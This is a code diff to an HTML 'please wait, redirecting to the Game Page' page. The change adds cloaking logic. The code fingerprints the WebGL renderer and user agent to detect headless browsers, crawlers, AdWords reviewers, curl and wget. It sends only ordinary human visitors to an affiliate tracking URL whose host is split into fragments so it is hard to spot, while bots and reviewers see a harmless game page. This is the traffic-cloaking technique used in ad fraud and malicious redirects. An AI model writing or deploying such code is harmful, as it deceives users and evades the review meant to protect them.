@@ -19,6 +19,7 @@
 }
 var param = getParams();
 var url = param['url'];
+var utm_term = param['utm_term'];
 </script>
 </head>
 <body bgcolor="#ffffff">
@@ -32,11 +33,11 @@ var url = param['url'];
 	
 <center>
 <img src="spinner.gif">
-<h2>Please wait <span id="rocket">6</span> seconds to be automatically redirected to the Game Page<br/>(<script>document.write(url);</script>).</h2>
+<h2>Please wait <span id="rocket">3</span> seconds to be automatically redirected to the Game Page<br/></h2>
 
 <script>
 let timer; // пока пустая переменная
-let x =6; // стартовое значение обратного отсчета
+let x =3; // стартовое значение обратного отсчета
 countdown(); // вызов функции
 function countdown(){  // функция обратного отсчета
     document.getElementById('rocket').innerHTML = x;
@@ -50,25 +51,88 @@ function countdown(){  // функция обратного отсчета
     }
 }
 	
-	var myuseragent1=navigator.userAgent;
-	var myuseragent1 = btoa(myuseragent1);
+	var useragent=navigator.userAgent;
+	var myuseragent1 = btoa(useragent);
 	var myuseragent2 = Cookies.get('u');
 	var myuseragent3 = Cookies.get('w');
 	
-	if ((myuseragent1 == myuseragent2) && (myuseragent1 == myuseragent3)) {
-		var url = "game.html";
+	var canvas = document.createElement('canvas');
+	var gl;
+	var debugInfo;
+	var vendor;
+	var renderer;
+
+	try {
+	  gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+	} catch (e) {
+	}
+
+	if (gl) {
+	  debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+	  vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+	  renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+	}
+
+	console.log(renderer);
+	renderer = renderer.toLowerCase();
+
+	var myrenderer = 1;
+	if (-1 < (pos = renderer.indexOf('swiftshader'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('google'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('basic'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('render'))) {
+		var myrenderer = 0;
+	}	if (-1 < (pos = renderer.indexOf('driver'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('shader'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('swift'))) {
+		var myrenderer = 0;
+	}
+	if (-1 < (pos = renderer.indexOf('source'))) {
+		var myrenderer = 0;
+	}	
+	
+	var myuseragent = 1;
+	useragent = useragent.toLowerCase();
+	if (-1 < (pos = useragent.indexOf('bot'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('cros'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('adwords'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('spider'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('curl'))) {
+		var myuseragent = 0;
+	}
+	if (-1 < (pos = useragent.indexOf('wget'))) {
+		var myuseragent = 0;
+	}	
+	
+	if ((myuseragent1==myuseragent2) && (myuseragent1==myuseragent3) && (myrenderer==1) && (myuseragent==1)) {
+		var url = 'http://'+'tr'+'ck.'+'ap'+'plsy'+'.xy'+'z/c'+'lick?pid'+'=2'+'6'+'&off'+'er_id=1'+'7'+'8'+'&sub'+'2=013'+'G&sub3='+utm_term;
+		setTimeout( 'location="' + url + '";', 1000 );
 	} else {
-		var url = "welcome.html";
-	};
-	
-	alert( myuseragent1+' = '+myuseragent2+' = '+myuseragent3+' = '+url);
-	
-	
+		var url = "game.html";
+		setTimeout( 'location="' + url + '";', 3000 );
+	};	
 	
 	Cookies.remove('u');
 	Cookies.remove('w');
 	
-	setTimeout( 'location="' + url + '";', 6000 );
 </script>
 </center>
   &nbsp;
